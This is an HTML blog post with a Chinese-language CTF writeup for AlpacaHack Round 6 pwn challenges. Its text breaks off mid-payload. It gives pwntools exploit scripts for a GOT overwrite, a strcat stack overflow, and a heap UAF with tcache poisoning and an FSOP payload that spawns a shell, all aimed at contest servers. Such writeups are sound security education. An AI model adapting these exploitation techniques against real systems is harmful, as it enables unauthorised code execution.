@@ -1,0 +1,656 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    AlpacaHack Round 6 (Pwn) - writeup |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="AlpacaHack Round 6 (Pwn) - writeup Author: 堇姬Naup  最近看到來賽後挑戰一下，除了第三題外都有打出來簡單記錄一下 inboundoob 寫 GOT 成 win function  1234567891011121314151617181920212223from pwn import *r&#x3D;process(&quot;.&#x2F;inbound&quot;)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AlpacaHack Round 6 (Pwn) - writeup">
+<meta property="og:url" content="http://example.com/2025/03/06/alpacahack-round6-pwn-writeup/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="AlpacaHack Round 6 (Pwn) - writeup Author: 堇姬Naup  最近看到來賽後挑戰一下，除了第三題外都有打出來簡單記錄一下 inboundoob 寫 GOT 成 win function  1234567891011121314151617181920212223from pwn import *r&#x3D;process(&quot;.&#x2F;inbound&quot;)">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-03-06T11:47:49.000Z">
+<meta property="article:modified_time" content="2025-03-06T11:51:38.324Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/images/posts_cover/alpacahack/alpacahack.png" alt="AlpacaHack Round 6 (Pwn) - writeup">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">AlpacaHack Round 6 (Pwn) - writeup</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AlpacaHack-Round-6-Pwn-writeup"><span class="toc-number">1.</span> <span class="toc-text">AlpacaHack Round 6 (Pwn) - writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#inbound"><span class="toc-number">1.1.</span> <span class="toc-text">inbound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#catcpy"><span class="toc-number">1.2.</span> <span class="toc-text">catcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ideabook"><span class="toc-number">1.3.</span> <span class="toc-text">ideabook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">1.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">61</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-alpacahack-round6-pwn-writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/06/alpacahack-round6-pwn-writeup/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-06T11:47:49.000Z" itemprop="datePublished">2025-03-06</time>
+    <time style="display: none;" id="post-update-time">2025-03-06</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="AlpacaHack-Round-6-Pwn-writeup"><a href="#AlpacaHack-Round-6-Pwn-writeup" class="headerlink" title="AlpacaHack Round 6 (Pwn) - writeup"></a>AlpacaHack Round 6 (Pwn) - writeup</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<p>最近看到來賽後挑戰一下，除了第三題外都有打出來<br>簡單記錄一下</p>
+<h2 id="inbound"><a href="#inbound" class="headerlink" title="inbound"></a>inbound</h2><p>oob 寫 GOT 成 win function </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&quot;./inbound&quot;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;34.170.146.252&quot;</span>, <span class="number">39404</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">debug = <span class="built_in">input</span>(<span class="string">&quot;(Y/N)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="string">&quot;Y&quot;</span> <span class="keyword">or</span> debug == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(-<span class="number">14</span>).encode())</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;value: &quot;</span>,<span class="built_in">str</span>(win+<span class="number">0x5</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;WIN:&quot;</span>,<span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="catcpy"><a href="#catcpy" class="headerlink" title="catcpy"></a>catcpy</h2><p>strcpy 沒有 overflow，但用 strcat 串上去後會 overflow，但是 strcat 不能用 Null byte，另外若不是用上限長度的話，會產生 \x0a，先去修掉原來 return address 上一個 libc address 的高位，之後 strcat 輸入到極限長度，蓋上 win function</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&quot;./catcpy&quot;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&quot;34.170.146.252&quot;</span>, <span class="number">32426</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="built_in">input</span>(<span class="string">&quot;(Y/N)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> debug == <span class="string">&quot;Y&quot;</span> <span class="keyword">or</span> debug == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">STRCPY</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">STRCAT</span>(<span class="params">data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Data: &quot;</span>,data)</span><br><span class="line"></span><br><span class="line">STRCPY(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x1</span>))</span><br><span class="line">STRCAT(<span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x18</span>+<span class="number">0x5</span>))</span><br><span class="line"></span><br><span class="line">STRCPY(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x1</span>))</span><br><span class="line">STRCAT(<span class="string">b&#x27;c&#x27;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x401256</span></span><br><span class="line"></span><br><span class="line">STRCPY(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1b</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[!] success strcpy&quot;</span>)</span><br><span class="line">STRCAT(<span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x4</span>)+p32(win+<span class="number">0x5</span>)[:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="ideabook"><a href="#ideabook" class="headerlink" title="ideabook"></a>ideabook</h2><p>有 oob，可以導致 index 輸入 16 的 chunk size，吃到 index 0 的 pointer，所以可以輸入長度變成超級長，所以導致 heap overflow + UAF<br>另外通過去修改某塊 chunk 的 size，及補上 prev size，讓我們可以去 free 出一塊 libc 再通過 UAF 就可以 leak libc 了<br>另外也可以 leak heap 來 bypass pointer protect<br>最後打 tcache poinsoning 來去任意寫 stderr，打 IO_FILE 來 get shell</p>
+<p>這題是用我的 template exploit 的<br>可以去我 github 上的 MyCTFlib 找到</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_filestructure_lib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libs.NAUP_fmt_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">x64_env()</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line">    debug_init()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 34.170.146.252 36507&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, ctx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>) </span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sla(<span class="string">b&quot;Content: &quot;</span>,ctx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">16</span>, <span class="number">0</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">32</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>, p64(<span class="number">0x31</span>)*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">leakdata = rc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">leakheap = u64(leakdata[<span class="number">0x58</span>:<span class="number">0x58</span>+<span class="number">0x8</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">4</span></span><br><span class="line">heapbase = leakheap</span><br><span class="line"></span><br><span class="line">edit(<span class="number">16</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x421</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line">read(<span class="number">16</span>)</span><br><span class="line">leakdata = rc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">leaklibc = u64(leakdata[<span class="number">0x58</span>:<span class="number">0x58</span>+<span class="number">0x8</span>]) &gt;&gt; <span class="number">8</span></span><br><span class="line">libcbase = leaklibc - <span class="number">0x21ace0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">7</span>,<span class="number">0xe0</span>)</span><br><span class="line">create(<span class="number">8</span>,<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk = libcbase + <span class="number">0x21b6a0</span></span><br><span class="line"></span><br><span class="line">fake_addr = fake_chunk^((heapbase + <span class="number">0x2f0</span>) &gt;&gt; <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">16</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+ p64(<span class="number">0</span>) + p64(<span class="number">0xe1</span>) + p64(fake_addr) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">9</span>, <span class="number">0xe0</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">libc_system = libcbase + <span class="number">0x50d70</span></span><br><span class="line">libc_IO21stderr = libcbase + <span class="number">0x21b6a0</span></span><br><span class="line"></span><br><span class="line">payload =  p32(<span class="number">0xfbad0101</span>) + <span class="string">b&quot;;sh\x00&quot;</span> </span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x58</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(libc_system)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x88</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(libc_IO21stderr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xa0</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(libc_IO21stderr - <span class="number">0x10</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xc0</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xd0</span> - 